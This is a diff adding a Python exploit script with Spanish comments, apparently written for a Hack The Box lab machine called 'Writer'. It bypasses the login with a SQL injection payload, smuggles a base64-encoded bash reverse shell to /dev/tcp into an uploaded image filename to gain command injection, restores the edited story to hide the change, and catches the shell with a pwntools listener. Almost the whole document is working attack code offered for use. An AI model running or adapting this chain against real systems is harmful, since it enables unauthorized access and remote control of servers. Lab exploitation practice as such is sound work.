@@ -1,0 +1,119 @@
+#!/usr/bin/python3
+
+import threading
+import requests
+import base64
+import signal
+import sys
+from pwn import *
+
+# Variables globales
+URL = "http://10.10.11.101"
+
+# Clases
+class Color:  # pos los colores pa que la vida tenga colores que coloreen la vida de colores ¿no?
+    PURPLE = '\033[95m'
+    CYAN = '\033[96m'
+    DARKCYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    WHITE = '\033[1;37m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
+# Funciones
+def exit2calle(sig, frame):  # controlamos salida forzosa
+    print(Color.RED + "\nSaliendowowowo..." + Color.END)
+    exit(0)
+
+signal.signal(signal.SIGINT, exit2calle)
+
+def login():  # bypasseamos panel-login y extraemos sesión
+    session = requests.Session()
+
+    payload = "admin' or '1"
+
+    try:
+        r = session.post(URL + '/administrative', data={"uname":payload,"password":payload}, timeout=3)
+    except Exception as err:
+        log.failure(Color.RED + "Problemas cargando la web..." + Color.END)
+        print(Color.RED + "Este es el error: " + Color.END + str(err))
+        exit(1)
+
+    if "Redirecting you to the dashboard" not in r.text: 
+        log.failure(Color.RED + "Fallo al logearnos :( Valida payload o el funcionamiento de la web" + Color.END)
+        exit(1)
+
+    return session
+
+def edit_story(session, filename_image, url_image):  # modificamos imágenes de la historia
+    # Hacemos esto por comodidad
+    b64_original_content1 = "SGF2ZSB5b3UgZXZlciBoYWQgdGhpcyBmZWVsaW5nPyBMaWtlIHlvdRlyZSBhIGhlbGl1bSBiYWxsb29uIHdpdGggeW91ciBzdHJpbmcgY3V0LiBBIHJvdHRpbmcgcGllY2Ugb2Ygd29vZCBhZHJpZnQgaW4gdGhlIHZhc3Qgb2NlYW4uDQoNCkRvZXMgc2F5aW5nIGl0IGxpa2UgdGhhdCBtYWtlIG1lIHNvdW5kIHRvbyBwcmV0ZW50aW91cz8gVGhpbmtpbmcgSRltIHNvbWUga2luZCBvZiBsaXRlcmFyeSB5b3V0aC4gT2YgY291cnNlIEkZbSBub3QuIEkZbSBqdXN0IHNhZC4gU2FkIHBlb3BsZSB0ZW5kIHRvIGJlIHVuZGVyIHRoZSBpbXByZXNzaW9uIHRoYXQgdGhleRl2ZSBiZWVuIHBvc3Nlc3NlZCBieSBMaSBCYWkgYW5kIHN1ZGRlbmx5IGtub3cgdGhlIGdydWVzb21lIHNlY3JldHMgb2YgdGhlIHVuaXZlcnNlIHRocm91Z2ggYSBmZXcgbGluZXMgb2YgcG9ldHJ5Lg0KDQpTZWNvbmQgeWVhciBvZiB1bml2ZXJzaXR5OyBteSBsaWZlIGlzIGdyZWF0LiBBbGwgdGhlIHNhZCB0aGluZ3MgZnJvbSB0aGUgcGFzdCBjYW4gYmUgdGhyb3duIHRvIHRoZSBiYWNrIG9mIHRoZSBtaW5kLg0KDQpTbywgbXkgbGlmZSBpc24ZdCBzYWQuDQoNCiogDQoNCkkZbSBzaXR0aW5nIGluIHRoZSBsaWJyYXJ5IGFmdGVyIGhvdXJzIGJlY2F1c2UgaXQZcyByYWluaW5nIG91dHNpZGUgYW5kIHRoZSBsaWJyYXJpYW4gZmVlbHMgc29ycnkgZm9yIG1lLg0KDQpMaW4gWXUuIE15IG5hbWUuDQoNCkluIENoaW5lc2UgdGhlIGZpcnN0IGNoYXJhY3RlciBpcyBteSBzdXJuYW1lIBMgaXQgbWVhbnMgd29vZHMuIFRoZSBzZWNvbmQgY2hhcmFjdGVyIG1lYW5zIHJhaW4uIERvbhl0IGtub3cgd2hldGhlciBteSBwYXJlbnRzIGRpZCB0aGlzIGludGVudGlvbmFsbHksIGJ1dCBpZiB5b3UgYWRkIHRocmVlIGRvdHMgdG8gdGhlIGZpcnN0IGNoYXJhY3RlciwgbWFrZSBpdCwgYW5kIGl0IG1lYW5zIGdldHRpbmcgcmFpbmVkIG9uLg0KDQpUaGUgcHJvbnVuY2lhdGlvbiBpcyB0aGUgc2FtZS4NCg0KTXkgYnJvdGhlchlzIG5hbWUgaXMgTGluIFFpdSAgEyB0aGUgc2Vjb25kIGNoYXJhY3RlciBtZWFucyBhdXR1bW4uIE91ciBuYW1lcyBwdXQgdG9nZXRoZXIgYXJlIGF1dHVtbiByYWluLiBRdWl0ZSBwb2V0aWMsIGlzbhl0IGl0PyBCdXQgaXQgc3RpbGwgbWFrZXMgbWUgd29uZGVyIHdoeSBteSBwYXJlbnRzIGNvdWxkbhl0IGhhdmUganVzdCBoYWQgb25lIHNvbiBuYW1lZCBMaW4gUWl1IFl1LCByYXRoZXIgdGhhbiBmcmFjdHVyaW5nIHRoZSBuYW1lIG92ZXIgdHdvIGNoaWxkcmVuLg0KDQpCZWNhdXNlIHdoYXQgaGFwcGVucyB3aGVuIG9uZSBpcyBsZWZ0IHdpdGhvdXQgdGhlIG90aGVyPw0KDQpBdXR1bW4gcmFpbiBwYWludHMgYW4gaW1hZ2Ugb2YgcGVvcGxlIHdhbGtpbmcgd2l0aCBjb2xvdXJmdWwgdW1icmVsbGFzIGFjcm9zcyBhIHNjZW5lcnkgb2YgcmVkLCBvcmFuZ2UgYW5kIHllbGxvdyBsZWF2ZXMuDQoNClJhaW4gb24gaXRzIG93biBpcyBvbmx5IGdyZXkuDQoNCiogDQoNClRoZSBsaWJyYXJ5IHdhcyBteSBicm90aGVyGXMgZmF2b3VyaXRlIHBsYWNlLiBUaGUgbGlicmFyaWFuIGFsc28gbGV0IGhpbSBzdGF5IGFmdGVyIGhvdXJzLiBJdCB3YXMgYmVjYXVzZSBzaGUgbGlrZWQgaGltIGluIHRoZSB3YXkgb2YgYSBmYXZvdXJlZCBzb24uIE5vdCBiZWNhdXNlIHNoZSBwaXRpZWQgaGltLiBXZWxsLCBtYXliZSBzaGUgZGlkIHdoZW4gc2hlIGxlYXJuZWQgdGhhdCBoZSBoYWQgdG8gZ2l2ZSB1cCBkYW5jaW5nIHRvIHRha2UgY2FyZSBvZiBvdXIgbXVtLg0KDQpTdGFnZSB0aHJlZSBvdmFyaWFuIGNhbmNlci4NCg0KV2h5IGRpZG4ZdCBvdXIgZGFkIHRha2UgY2FyZSBvZiBoZXI/IFdoeSBkaWRuGXQgST8NCg0KV2h5IGhpbT8NCg0KRGFkIGRpZG4ZdCB0aGluayB0aGF0IHdvcmsgd2FzIG1vcmUgaW1wb3J0YW50IHRoYW4gbXVtIBMgaGUgd2Fzbhl0IHRoYXQga2luZCBvZiBwZXJzb24uIEl0IHdhcyBqdXN0IHRoYXQgc29tZW9uZSBuZWVkZWQgdG8gYmUgd29ya2luZyBmb3IgdGhlIG1vbmV5Lg0KDQpJIGRpZG4ZdCB0aGluayB0aGF0IGJhbGxldCB3YXMgbW9yZSBpbXBvcnRhbnQgdGhhbiBtdW0gEyBJGW0gbm90IHRoYXQga2luZCBvZiBwZXJzb24uIEl0IHdhcyBqdXN0IHRoYXQgc29tZW9uZ"
+    b64_original_content2 = "SBuZWVkZWQgdG8gYmUgd29ydGh5IG9mIGRyZWFtaW5nLg0KDQpNeSBicm90aGVyIBMgR2UZZ2UgYXMgSSBjYWxsZWQgaGltLCBoYWQgZ3JpcHBlZCBtZSBieSB0aGUgc2hvdWxkZXJzIGluIHRoZSBoYWxsd2F5IG9mIHRoZSBob3NwaXRhbC4NCg0KHE5ldmVyIGdpdmUgdXAgb24gZGFuY2luZywgeGlhbxl5dSwdIBMgaXQgd2FzIGEgbmlja25hbWU7IGl0IG1lYW50IGxpdHRsZSByYWluLiAcUGxlYXNlLh0NCg0KHFlvdRlsbCBzdGFydCBkYW5jaW5nIGFnYWluIHdoZW4gTWEZbWEgZ2V0cyBiZXR0ZXIsIHdvbhl0IHlvdT8dIEkgc2FpZC4NCg0KSGlzIGZhY2UgZGFya2VuZWQsIHRoZW4gaGUgaGVsZCBteSBoYW5kLiAcQ29tZSwgaXQZcyB0aW1lIHRvIGdvIGhvbWUuHQ0KDQpJIHVuZGVyc3RhbmQgbm93IHRoYXQgaGUgZGlkbhl0IHRoaW5rIG11bSB3YXMgZ29pbmcgdG8gZ2V0IGJldHRlci4gVGhhdCBoZSBjb3VsZCBoYXZlIHN0YXJ0ZWQgZGFuY2luZyBhZ2Fpbi4gVGhhdCB0aGVyZSB3ZXJlIG1vcmUgcm9hZHMgdG8gZGFuY2luZyB0aGFuIHByb2Zlc3Npb25hbC4NCg0KQnV0IEkgcHVzaGVkIGZvciB0aGF0IGRyZWFtLCBvdXIgZHJlYW0sIHVudGlsIEkgbGF5IGVhY2ggbmlnaHQgd2l0aCBhbiBhY2hpbmcgYm9keSwgYnV0IHN0aWxsIGRyYWdnZWQgbXlzZWxmIG91dCBvZiBiZWQgYXQgZm91ciBpbiB0aGUgbW9ybmluZy4gVW50aWwgdGhlIHN0dWRpbxlzIHByYWN0aWNlIHJvb20gYmVjYW1lIG15IGFsbW9zdC1ob21lLCBhbmQgdGhlIHNtZWxsIG9mIHN3ZWF0IGFuZCBodWZmcyBvZiBleGVydGlvbiB3ZXJlIHBlcmZ1bWUgdG8gbXkgc2tpbiBhbmQgbXVzaWMgdG8gbXkgZWFycy4NCg0KKiANCg0KVGhlIHJhaW4gYmVhdHMgbG91ZGVyIG9uIHRoZSBnbGFzcy4gSSBsb29rIHVwIGF0IHRoZSBoaWdoZXN0IHNoZWxmLiBJIHVzZWQgdG8gYmUgYWJsZSB0byBwdXQgbXkgbGVnIHVwIHRoZXJlLiBCZW5kIG15IGxpbWJzIGluIHdheXMgdGhhdCB3b3VsZCBtYWtlIHlvdSB0aGluayB0aGV5IHdlcmUgbWFkZSBvZiBydWJiZXIuIERvIHlvdSBldmVuIGhhdmUgYm9uZXM/IFBlb3BsZSBsaWtlZCB0byBhc2sgbWUuDQoNCklmIEkgZG8gdGhhdCBub3cgSSBtaWdodCBwdWxsIGEgbXVzY2xlIGFuZCBub3QgYmUgYWJsZSB0byB3YWxrIGZvciBhIHdlZWsuDQoNCk15IGJhbGxldCB0ZWFjaGVyIHVzZWQgdG8gc2F5OiBZb3UgZG9uGXQgcHJhY3Rpc2UgZm9yIGEgZGF5IGFuZCB5b3VyIGJvZHkgY2FuIGZlZWwgaXQuIFlvdSBkb24ZdCBwcmFjdGlzZSBmb3IgdHdvIGRheXMgYW5kIHlvdSBjYW4gZmVlbCBpdC4gWW91IGRvbhl0IHByYWN0aXNlIGZvciB0aHJlZSBkYXlzIGFuZCBldmVyeW9uZSBlbHNlIGNhbiBmZWVsIGl0Lg0KDQpNeSB0aHJlZSBkYXlzIGhhdmUgcGlsZWQgaW50byBtb250aHMgYnkgbm93Lg0KDQoqIA0KDQpNeSBicm90aGVyIHdhcyBhbHdheXMgZ2VudGxlLiBJIHdhcyBhbHdheXMgZ2V0dGluZyBodXJ0Lg0KDQocSXQZcyBhbGwgcmlnaHQsIGp1c3Qgc3F1ZWV6ZSBteSBoYW5kLiBJdBlsbCBiZSBvdmVyIGluIGEgZmV3IHNlY29uZHMuHQ0KDQpNeSBleWVzIHdlcmUgYWxyZWFkeSBibHVycnkgd2l0aCB0ZWFycyBhbmQgbXkgdGhyb2F0IHJhdyB3aXRoIHN3YWxsb3dlZCBzY3JlYW1zLiBJIGNvdWxkIGJlYXIgaW5qdXJpZXMuIE9uZSB0aW1lLCBJIGRhbmNlZCBhbiBlbnRpcmUgY29uY2VydCB3aXRoIGEgZnJhY3R1cmVkIGFua2xlLiBCdXQgZm9yIHNvbWUgcmVhc29uLCB0aGUgbW9tZW50IG15IGJyb3RoZXIgYXBwZWFyZWQgYmVmb3JlIG1lLCBteSBjaGVla3MgZ2F2ZSB3YXkgdG8gcml2ZXJzLg0KDQpUaGUgZG9jdG9yIHNuYXBwZWQgbXkga25lZSBiYWNrIGludG8gcGxhY2UgYW5kIEkgY3JpZWQgaW50byBteSBicm90aGVyGXMgY2hlc3QgZm9yIGZpZnRlZW4gbWludXRlcy4NCg0KHSBJdBlzIG9rYXksIGl0GXMgZ29vZCB0byBjcnkgaXQgb3V0LCB3aGVuIHdlIGdvIGhvbWUsIEdlGWdlIHdpbGwgbWFrZSB5b3Ugc29tZXRoaW5nIGRlbGljaW91cy4NCg0KKiANCg0KSSBtaXNzIHRoZSBzd2VldCBhbmQgc291ciByaWJzIHRoYXQgR2UZZ2UgbWFkZS4NCg0KSSBmaW5kIHRoYXQgSRl2ZSBiZWVuIHRoaW5raW5nIGluIENoaW5lc2UgbW9yZSBhbmQgbW9yZSBub3dhZGF5cy4gUHJvYmFibHkgYmVjYXVzZSBJIG1pc3MgaGltLiBNaXNzIGhvdyBoaW0gYW5kIG11bSB1c2VkIHRvIHlhbW1lciBhdCBlYWNoIG90aGV"
+    b64_original_content3 = "yIGluIFNoYW5naGFpbmVzZS4gSGUgc3Bva2UgdG8gbWUgaW4gU2hhbmdoYWluZXNlIG9uIG9jY2FzaW9ucy4NCg0KSSB1bmRlcnN0YW5kIGl0LCBidXQgSSBuZXZlciBsZWFybmVkIGhvdyB0byBzcGVhayBpdC4NCg0KVGhhdBlzIG5vdCB3aGF0IEkZbSBzYWQgYWJvdXQuDQoNCkkgcGljayB1cCBhIGJvb2sgYW5kIHRyeSB0byByZWFkLCBidXQgdGhlIGxpZ2h0aW5nIGlzIHRvbyBkaW0sIGFuZCB0aGUgd29yZHMgYXJlIGp1c3QgYSBibHVyIG9mIGJsYWNrLg0KDQocWXUsHSB0aGUgbGlicmFyaWFuIHNheXMuIBxUaGUgcmFpbiBoYXMgc3RvcHBlZC4dDQoNChxUaGFua3MsHSBJIHNheSwgcGlja2luZyB1cCBteSBiYWcuDQoNCk1heWJlIHNoZSBzZWVzIHNvbWUgdGVhcnMgaW4gbXkgZXllcywgb3IgbWF5YmUgSSBqdXN0IGxvb2sgc2FkLiAcQXJlIHlvdSBva2F5Px0gc2hlIGFza3MuDQoNCkkgc21pbGUuIBxJGW0gZ29vZCwdIEkgcmVwbHkuIBxUaGFua3MgZm9yIGFza2luZy4dDQoNCiogDQoNClRoZSBwYXZlbWVudCBoYXMgYmVlbiB3YXNoZWQgY2xlYW4uIEFyZSB5b3Ugb2theT8gQ2FuIHRoYXQgcXVlc3Rpb24gcmVhbGx5IGNoYW5nZSB0aGluZ3M/IElzIHNhdmluZyBhIGxpZmUgdHJ1bHkgb25lIHF1ZXN0aW9uIGF3YXk/DQoNCklmIHNvLCBJIHNob3VsZCBoYXZlIGFza2VkLiBTaG91bGQgbm90IGhhdmUgYXNzdW1lZCB0aGF0IG15IGJyb3RoZXIgd291bGQgYmUgZmluZSBhZnRlciBtdW0gd2FzIGNhbmNlci1mcmVlLiBUaGF0IHVuZGVyIGhpcyBsb25nIHNsZWV2ZXMgaW4gc3VtbWVyIHRoZXJlIHdhcyBzbW9vdGggc2tpbi4gVGhhdCBpbiBoaXMgaGVhcnQsIHRoZXJlIHdhc24ZdCBhbiBpbnZpc2libGUgZGFya25lc3MuDQoNClBlcmhhcHMgaGlzIG5hbWUgZXZlbiBmb3JldG9sZCBpdC4gQWRkIGEgaGVhcnQsIHhpbiwgdW5kZXIgdGhlIGNoYXJhY3RlciBmb3IgYXV0dW1uLCBxaXUsIGFuZCBpdCBiZWNvbWVzIGNob3UgEyB0byB3b3JyeS4gV2hlbiB3b3JyeSBidWlsZHMgdXAsIHRoZSB3ZWlnaHQgaXMgY3J1c2hpbmcuIEV2ZW4gd2hlbiB0aGF0IHdvcnJ5IGlzbhl0IG5lZWRlZCBhbnltb3JlLg0KDQpBbGwgR2UZZ2UgaGFkIGRvbmUgd2FzIHdvcnJ5LiBXb3JyeSBhYm91dCBtdW0gYW5kIGhlciBwb3NzaWJsZSByZWxhcHNlLiBXb3JyeSBhYm91dCBkYWQgYW5kIHRoZSBzdHJlc3Mgb2YgaGlzIHdvcmsuIFdvcnJ5IGFib3V0IG1lLg0KDQpHZRlnZSB3YXMgdGhlIG9uZSB3aG8gY2FyZWQgZm9yIG1lIHRoZSBtb3N0Lg0KDQp0ZW5nLCBvbiBpdHMgb3duIG1lYW5zIGh1cnQsIHBhaW4sIGJ1dCB5b3UgYWRkLCB3byATIG1lLCBhbmQgaXQgYmVjb21lcyB0byBiZSBsb29rZWQgYWZ0ZXIsIGNhcmVkIGZvci4gDQoNCnhpbhl0ZW5nLiBUaGUgZmlyc3QgY2hhcmFjdGVyIGlzIGhlYXJ0LiBUaGUgc2Vjb25kIGNoYXJhY3RlciBpcyBodXJ0LiBJdCBtZWFucyB0byBjYXJlIGFib3V0IGEgcGVyc29uLCBmZWVsIHRoYXQgdHdpbmdlIGluIHRoZSBoZWFydCB3aGVuIHRoZXkgYXJlIGluIHBhaW4uDQoNCkkgY2FyZSBzbyBtdWNoIHRoYXQgbXkgaGVhcnQgaHVydHMgZm9yIHlvdS4NCg0KTXkgaGVhcnQgaHVydHMgZm9yIGhpbSBub3csIGJ1dCBoZRlzIGdvbmUuDQoNCkkgc3RvcHBlZCBkYW5jaW5nIGJlY2F1c2UgdGhlIGRyZWFtIGhhZCBzaGF0dGVyZWQuIEl0IGNhbhl0IGJlIG91ciBkcmVhbSBhbnltb3JlLiBCZWNhdXNlIGhlGXMgZ29uZS4NCg0KRGVhZC4NCg0KTGVmdCB0aGUgd29ybGQsIG5vdCB3aXRoIHRoZSBjb21mb3J0IG9mIGJlaW5nIGhlbGQsIGJ1dCB3aXRoIGhpcyBmaW5hbCBicmVhdGggZW50cnVzdGVkIGluIGEgYmxhZGUgYWJvdXQgdG8gY2F1c2UgdGhlIG1vc3QgaXJyZXZlcnNpYmxlIG9mIGRhbWFnZXMuIEEgY3V0IGNhbiBoZWFsLiBBIGRlZXBlciBjdXQgY2FuIHNjYXIuIEJ1dCB0aGVyZSBpcyBhIHBvaW50IHdoZXJlIGRlZXAgYmVjb21lcyB0b28gZGVlcC4NCg0KTm8gYW1vdW50IG9mIHN0aXRjaGVzIGFuZCBiYW5kYWdlcyBjYW4gcGllY2UgaXQgYmFjayB0b2dldGhlci4gTm8gYW1vdW50IG9mIBhhcmUgeW91IG9rYXlzGSBhbmQgGEkgbG92ZSB5b3VzGSBjYW4gZml4IGFueXRoaW5nIG5vdy4gWW91IGFyZSBub3QgYWxvbmUuIEkgYW0gaGVyZSBmb3IgeW91LiBZb3UgYXJlIGxvdmVkLiBNb3JlIHRoYW4geW91IHdpbGw"
+    b64_original_content4 = "gZXZlciBrbm93Lg0KDQpHZRlnZSwganVzdCBsZXQgbWUgY2FyZSBmb3IgeW91LiANCg0KSXQgc3RhcnRzIHJhaW5pbmcgYWdhaW4sIGFuZCBJIHN0YW5kIHRoZXJlLiBCZWluZyByYWluZWQgb24uDQoNCkkgY2xvc2UgbXkgZXllcyBhbmQgbGlzdGVuIHRvIGl0LiBJIHRoaW5rIG9mIGF1dHVtbiB3aXRoIGl0cyByZWQsIG9yYW5nZSBhbmQgeWVsbG93LiBNeSBib2R5IG1vdmVzIHdpdGggdGhlIHJhaW4gYXMgbXkgbXVzaWMuIE15IG11c2NsZXMgYXJlIHN0aWZmLCBidXQgbXkgbGltYnMgcmVtZW1iZXIgdGhlIHRoaXJ0ZWVuIHllYXJzIG9mIGFjaGVzIGFuZCBzd2VhdCBtYXNrZWQgdG8gbW92ZSBpbiBhIHdheSB0aGF0IG1ha2VzIG15IGJvZHkgaW50byBhcnQuDQoNCk15IGhlYXJ0IGh1cnRzLiBCZWNhdXNlIEkgaHVydC4gQW5kIEkgZGFuY2UuIEJlY2F1c2UgSSBsb3ZlLg0KDQpBcm1zIGJhdHRpbmcgdGhlIHJhaW4uIFJlYWNoaW5nIG91dCBmb3IgYW4gdW1icmVsbGEsIGEgd2FybSBib2R5LCBzb21lb25lIHRvIGhvbGQgbWUgaW4gdGhlIHJhaW4uDQoNCllvdSBzYXkgeW91IGFyZSB0aGUgb2xkZXIgYnJvdGhlciBhbmQgSSBhbSB0aGUgeW91bmdlciBicm90aGVyLCBzbyB5b3Ugd2lsbCBibG9jayBtZSBmcm9tIHRoZSB3aW5kLCBhbmQgc2hpZWxkIG1lIGZyb20gdGhlIHJhaW4uDQoNCllvdSBzYXkgeW91IGFyZSB0aGUgb2xkZXIgYnJvdGhlciBhbmQgSSBhbSB0aGUgeW91bmdlciBicm90aGVyLCBzbyBJIHRvbyB3aWxsIGJsb2NrIHlvdSBmcm9tIHRoZSB3aW5kLCBhbmQgc2hpZWxkIHlvdSBmcm9tIHRoZSByYWluLg0KDQpCZWNhdXNlIHdoZW4gSSBkYW5jZSwgSSBkb24ZdCBkYW5jZSBhYm91dCBhdXR1bW4sIEkgZG9uGXQgZGFuY2UgYWJvdXQgdGhlIHJhaW4uDQoNCkkgZGFuY2UgYWJvdXQgYXV0dW1uIHJhaW4uICAg"
+    b64_original_content = b64_original_content1 + b64_original_content2 + b64_original_content3 + b64_original_content4
+    original_content = base64.b64decode(b64_original_content).decode()
+
+    data_post = {
+        "title": "Autumn Rain",
+        "tagline": "#Fiction",
+        "image_url": url_image,
+        "content": original_content
+    }
+    data_files = [('image',(filename_image, "", 'application/octet-stream'))]
+
+    # Evitamos que se quede pegada la petición, así que si pasan 3 segundos es por que se genero la RevSH, aprovechamos y la terminamos.
+    try:
+        #proxies = {"http":"http://127.0.0.1:8080"}    # coloca proxies=proxies si quieres ver la data como viaja (o por si surgue algún problema podemos hacer debug)
+        r = session.post(URL + '/dashboard/stories/edit/2', data=data_post, files=data_files, timeout=3)
+    except requests.exceptions.Timeout:
+        pass
+
+def print_help():  # le mostramos a l@s loquit@s como usar el programa
+    print(f"uso: {sys.argv[0]} <attacker_ip> <attacker_port>")
+    print("\nOpciones:")
+    print("  <attacker_ip>      Dirección IP para establecer Reverse Shell.")
+    print("  <attacker_port>    Puerto para establecer Reverse Shell.")
+    print("\nEjemplo:")
+    print(f"  {sys.argv[0]} 10.10.14.157 4433")
+    exit(1)
+
+def main():  # controlamos el flujo compleeeeeeeto del programa
+    # Generamos una sesión en la web
+    session = login()
+
+    # Modificamos las imágenes para conseguir command-injection
+    lhost = sys.argv[1]; lport = sys.argv[2]
+    reverse_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    b64_reverse_shell = base64.b64encode(bytes(reverse_shell, 'utf-8')).decode('ascii')
+    filename_image = f"hola.jpg;echo {b64_reverse_shell}|base64 -d|bash;"
+    url_image = f"file:///var/www/writer.htb/writer/static/img/{filename_image}"
+
+    edit_story(session, filename_image, url_image)
+
+    # Dejamos la historia como si no hubiera sido modificada
+    filename_image = "rain.jpg"
+    url_image = ""
+
+    edit_story(session, filename_image, url_image)
+
+if '__main__' == __name__:
+    if len(sys.argv) != 3:
+        print_help()
+
+    try:
+        threading.Thread(target=main).start()
+    except Exception as e:
+        log.error(str(e))
+
+    shell = listen(sys.argv[2], timeout=30).wait_for_connection()
+
+    if shell.sock is None:
+        log.failure(Color.END + "La conexión no se ha obtenido, F." + Color.END)
+        exit(1)
+
+    shell.interactive()
